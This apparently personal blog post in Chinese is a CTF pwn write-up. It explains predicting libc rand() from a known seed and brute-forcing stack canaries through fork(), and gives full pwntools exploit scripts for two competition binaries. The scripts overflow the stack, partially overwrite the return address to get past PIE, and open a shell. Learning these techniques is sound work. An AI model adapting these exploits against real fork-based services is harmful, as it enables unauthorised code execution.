---
layout: post
title: '随机数预测与爆破canary'
date: "2026-01-29T00:54:52Z"
---
随机数预测与爆破canary
==============

Find a new fortunate four-leaf clover.

随机数预测
-----

随机数能预测主要是因为计算机本质上无法真正生成随机数，生成的是伪随机数。只要种子一样，生成的算法一样，那么结果就是一样。像c语言的srand函数就是设置种子，接下来调用rand()就会生成随机数，如果不先srand设置种子，直接rand()，那么种子就默认为1。我们在python中可以通过a=cdll.LoadLibrary('./libc.so.6')来加载对应的libc库，然后接下来a.srand()就可以设置种子，利用a.rand()就可以生成随机数，只要种子一样，算法一样（libc库一样）就可以预测随机数了。接下来我们看例题。

#### ISCTF2024-ez\_game

老规矩先checksec  

只开了nx保护，接下来放ida看看  

逻辑很简单，先puts告诉我们一些东西，接下来就是一个时间限制是15s，然后就是一个gets，不过这里有有点奇怪，正常理论上应该可以覆盖种子和循环标志直接终止循环来getshell。这里不知道为什么不行，我试过是不可以的。不过我们还可以预测20001次随机数来起到getshell。我们只需要像刚才讲过的操作一遍就可以了，至于这个gets可以不管，随便输入。完整exp如下：

    from pwn import *
    import sys
    from ctypes import *
    context.log_level='debug'
    context.arch='amd64'
    elf=ELF('./pwn')
    libc = ELF('./libc.so.6')
    flag = 1
    if flag:
        p = remote('challenge.imxbt.cn',32576)
    else:
        p = process('./pwn')
    sa = lambda s,n : p.sendafter(s,n)
    sla = lambda s,n : p.sendlineafter(s,n)
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    leak = lambda name,addr :log.success(name+"--->"+hex(addr))
    def dbg():
        gdb.attach(p)
        pause()
    libc=cdll.LoadLibrary('./libc.so.6')
    ru(b'Enter your username: ')
    sl(b'firefly_star')
    libc.srand(1)
    re=[0]*20001
    for i in range(20001):
    	re[i]=str(libc.rand()%7+1)
    	sl(re[i])
    ti()
    

这里因为有时间限制，所以我们就不用管第几轮第几轮了，直接快速sendline发过去就可以了。

爆破canary
--------

### canary是什么？

canary的本意是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。而在pwn中，canary是一种保护栈溢出的机制，用于防止栈溢出，一般位于rbp-8的位置，因为我们想要覆盖返回地址一定要覆盖过rbp，所以一定会覆盖到canary。并且canary低字节为\\x00，这样就确保了一般不能被printf，与puts打印出来。并且在函数返回时会把栈上的canary与TLS 上的canary进行异或，假如这两者不相同就会触发\*\*\* stack smashing detected \*\*\*直接终止程序。

绕过canary保护主要有五种办法，第一种是格式化字符串/printf/puts泄露；第二种是爆破canary（要有fork），也就是接下来我们要讲的；第三种是Stack mashing（故意触发canary，不过要比较低的版本）；第四种是改\_\_stack\_chk\_fail的got表，也是故意触发canary去执行函数（fmt的时候用过这种了）。还有一种就是覆盖tls表，因为canary一个在栈上，一个在tls上，只要我们把TLS 上的canary覆盖成和栈上的一样，也可以绕过canary。

### 爆破canary的条件

爆破canary主要就是利用子进程与父进程canary一样，并且子进程结束不影响父进程继续执行的特性，通过在子进程一个个试canary的值最终试出完整的canary。所以爆破的前提就是要有fork子进程，并且要能一直触发子进程。下面我们看例题

#### BaseCTF2024新生赛-没有 canary 我要死了!

老规矩先checksec  

直接保护全开，还是有点吓人的，我们去ida看看。  

首先生成了一个随机数让我们猜，如果猜对了就创建子进程，不对就退出程序。接下来子进程有一个read栈溢出只能溢出0x10（刚好覆盖返回地址），但有canary，并且没有格式化字符串等泄露，接下来父进程为wait等待子进程结束，子进程结束后就继续猜随机数，猜对了重复上述过程。所以我们就可以通过多次预测随机数进入子进程，然后一位一位爆破canary，只要我们程序没退出，canary就不会变。只要多爆破几次就一定能全爆破出来。接下来我们写脚本，这个题好像没给libc.so.6文件？所以我只能打本地了，预测随机数需要这个文件来实现算法相同。主要就是一个字节一个字节爆破出canary，并且因为canary低字节是\\x00，所以我们只需要爆破7位就可以了。爆破canary脚本如下

    a=libc1.time(0)
    libc1.srand(a)
    global can
    can=b'\x00'#低字节是\x00直接写
    for j in range(7):#爆破7次
      for i in range(256):#遍历ascii码表
        ru(b"oh, welcome to BaseCTF\n")#接收其他输出，防止干扰是否触发*** stack smashing detected ***
        pa=libc1.rand()%50#随机数预测
        sl(str(pa))
        pay=b'b'*0x68+can+p8(i)
        sd(pay)
        c=p.recvline()#接收其他输出
        b=p.recvline() #接收*** stack smashing detected ***
        if b'stack' in b:#判断是否触发*** stack smashing detected ***，触发就继续遍历，未触发就+一位并继续爆破下一位
            continue
        else :
            can+=p8(i)
            break
    

同时我们别忘了这个程序还有pie保护，经过调试可知子进程那个read最后还要返回main，我们因为泄露不出pie基址所以只能再爆破一次了，因为main函数的地址是pie基址+0x134f而我们shell函数是pie基址+0x12B1（在后面函数起始地址往下一点，实现栈对齐），可以看见main函数和后面函数他们应该地址是axxx和ayyy，就最好三位不一样，而我们哪怕p8发送一字节都会覆盖掉两位，所以我们要把后门函数设置成0x02b1然后每个循环+0x1000去爆破后面函数的地址，爆破后面函数的脚本如下

    for k in range(16):
        b=libc1.rand()%50
        sl(str(b))
        pay=0x68*b'b'+can+b'b'*8+p16(back)
        sd(pay)
        d=p.recvline()
        if b'welcome' in d: 
            back+=0x1000
            p.recvline()
            continue
        else :
            break
    

完整exp如下：

    from pwn import *
    import sys
    from ctypes import *
    context.log_level='debug'
    context.arch='amd64'
    elf=ELF('./pwn')
    libc = ELF('./libc.so.6')
    libc1=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
    '''#srop
    srop=SigreturnFrame()
    srop.rax=
    srop.rdi=
    srop.rsi=
    srop.rsp=
    srop.rip=
    srop.rbp=
    '''
    '''#dlresolve
    dlresolve=Ret2dlresolvePayload(elf=elf,symbol= ,arg=[ ],resolution_addr= ,data_addr=)
    rop=ROP(elf)
    rop.ret2dlresolve(dlresolve)
    '''
    flag = 0
    if flag:
        p = remote('1')
    else:
        p = process('./pwn')
    sa = lambda s,n : p.sendafter(s,n)
    sla = lambda s,n : p.sendlineafter(s,n)
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    leak = lambda name,addr :log.success(name+"--->"+hex(addr))
    u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
    def ph(s):
        print(hex(s))
    def dbg():
        gdb.attach(p)
        pause()
    a=libc1.time(0)
    libc1.srand(a)
    global can
    can=b'\x00'
    for j in range(7):
      for i in range(256):
        ru(b"oh, welcome to BaseCTF\n")
        pa=libc1.rand()%50
        sl(str(pa))
        pay=b'b'*0x68+can+p8(i)
        sd(pay)
        c=p.recvline()
        b=p.recvline()
        if b'stack' in b:
            continue
        else :
            can+=p8(i)
            break
    print(can)
    pause()
    back=0x02B1
    for k in range(16):
        b=libc1.rand()%50
        sl(str(b))
        pay=0x68*b'b'+can+b'b'*8+p16(back)
        sd(pay)
        d=p.recvline()
        if b'welcome' in d:
            back+=0x1000
            p.recvline()
            continue
        else :
            break
    ti()
    

效果如下  

这题还是有点意思的。